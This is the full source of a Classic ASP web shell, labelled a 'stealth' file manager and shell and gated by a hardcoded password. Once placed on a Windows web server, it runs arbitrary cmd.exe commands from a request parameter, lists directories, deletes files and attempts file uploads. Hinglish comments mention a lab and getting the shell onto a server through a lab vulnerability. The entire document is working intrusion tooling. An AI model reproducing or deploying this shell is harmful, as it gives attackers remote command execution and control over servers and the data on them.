<%@ Language=VBScript %>
<%
' CHANGE KARNA MAT BHULNA
Const PASSWORD = "target"

Dim AuthOK
AuthOK = (Request.QueryString("p") = PASSWORD) Or (Request.Form("p") = PASSWORD)

If Not AuthOK Then
    Response.Write "Access Denied"
    Response.End
End If

Dim objFSO, objShell
Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
Set objShell = Server.CreateObject("WScript.Shell")

Dim strPath : strPath = Request("path")
If strPath = "" Then strPath = Server.MapPath(".")

Dim strAction : strAction = Request("act")

' ===================== CMD EXECUTE =====================
If strAction = "cmd" Then
    Dim strCmd : strCmd = Request("cmd")
    If strCmd <> "" Then
        Dim objExec, strOutput
        Set objExec = objShell.Exec("cmd.exe /c " & strCmd)
        strOutput = objExec.StdOut.ReadAll & objExec.StdErr.ReadAll
        Response.Write "<pre style='color:#0f0; background:#000; padding:10px;'>" & Server.HTMLEncode(strOutput) & "</pre>"
    End If
End If

' ===================== DELETE =====================
If strAction = "del" Then
    Dim strFile : strFile = Request("file")
    If objFSO.FileExists(strFile) Then
        objFSO.DeleteFile strFile
        Response.Write "<font color='lime'>Deleted: " & Server.HTMLEncode(strFile) & "</font><br>"
    Else
        Response.Write "<font color='red'>File not found</font>"
    End If
End If

' ===================== UPLOAD ATTEMPT (Basic - may not work perfectly) =====================
If strAction = "upload" Then
    Response.Write "<pre>Upload attempt...<br>"
    On Error Resume Next
    Dim binData, Stream, UploadPath, FileName, Pos
    UploadPath = strPath & "\"
    
    ' Yeh basic hai - full multipart parse nahi, sirf small files ke liye try
    ' Better: Motobit Pure ASP Upload include kar (niche link se code le)
    If Request.TotalBytes > 0 Then
        Set Stream = Server.CreateObject("ADODB.Stream")
        Stream.Type = 1 ' adTypeBinary
        Stream.Open
        Stream.Write Request.BinaryRead(Request.TotalBytes)
        Stream.Position = 0
        binData = Stream.Read
        
        ' Very crude parse - boundary find karo (lab ke liye small file test kar)
        ' Real mein full parser chahiye
        Response.Write "Total bytes received: " & Request.TotalBytes & "<br>"
        
        ' Assume single file, filename extract (not reliable)
        Dim Boundary : Boundary = Request.ServerVariables("HTTP_CONTENT_TYPE")
        Boundary = Mid(Boundary, InStr(Boundary, "boundary=") + 9)
        
        ' Yeh part incomplete hai - full code ke liye niche Pure ASP use kar
        Response.Write "Upload partial - use external upload or Pure ASP script for reliable.<br>"
        Response.Write "Suggestion: Upload via lab vuln, then manage here."
    Else
        Response.Write "No file data received."
    End If
    Response.Write "</pre>"
End If
%>

<html>
<head><title>Classic ASP Stealth Shell</title></head>
<body style="font-family:consolas; background:#000; color:#0f0; margin:20px;">

<h2>Classic ASP Stealth File Manager + Shell</h2>
<p>Password: <%=PASSWORD%> | Current User: <%=objShell.ExpandEnvironmentStrings("%USERNAME%")%></p>

<!-- BROWSE FORM -->
<form method="get">
    <input type="hidden" name="p" value="<%=PASSWORD%>">
    Path: <input name="path" value="<%=Server.HTMLEncode(strPath)%>" size="70">
    <input type="submit" value="Browse">
</form>

<h3>Files in: <%=Server.HTMLEncode(strPath)%></h3>
<%
If objFSO.FolderExists(strPath) Then
    Dim folder : Set folder = objFSO.GetFolder(strPath)
    
    For Each subf In folder.SubFolders
        %>
        [DIR] <a href="?p=<%=PASSWORD%>&path=<%=Server.URLEncode(subf.Path)%>"><%=subf.Name%></a><br>
        <%
    Next
    
    For Each file In folder.Files
        Dim fpath : fpath = Server.URLEncode(file.Path)
        %>
        <%=file.Name%> (<%=file.Size%> bytes) | 
        <a href="?p=<%=PASSWORD%>&act=del&file=<%=fpath%>" onclick="return confirm('Delete?')">DEL</a><br>
        <%
    Next
Else
    Response.Write "<font color='red'>Invalid path!</font>"
End If
%>

<!-- CMD FORM -->
<h3>Execute Command</h3>
<form method="get">
    <input type="hidden" name="p" value="<%=PASSWORD%>">
    <input type="hidden" name="act" value="cmd">
    <input name="cmd" size="90" value="whoami /all">
    <input type="submit" value="Run">
</form>

<!-- UPLOAD FORM (Password GET se ja raha) -->
<h3>Upload File (Basic - may fail for large/multiple, use lab upload instead)</h3>
<form method="post" enctype="multipart/form-data" action="?p=<%=PASSWORD%>&act=upload">
    <input type="file" name="file">
    <input type="submit" value="Upload to Current Dir">
</form>
<p style="color:yellow;">Note: Agar upload fail kare to Pure ASP Upload script add kar (https://www.motobit.com/help/scptutl/pure-asp-upload.htm se full code download kar ke include kar _upload.asp jaise). Ya lab ke original upload feature se file daal.</p>

</body>
</html>

<%
Set objFSO = Nothing
Set objShell = Nothing
%>
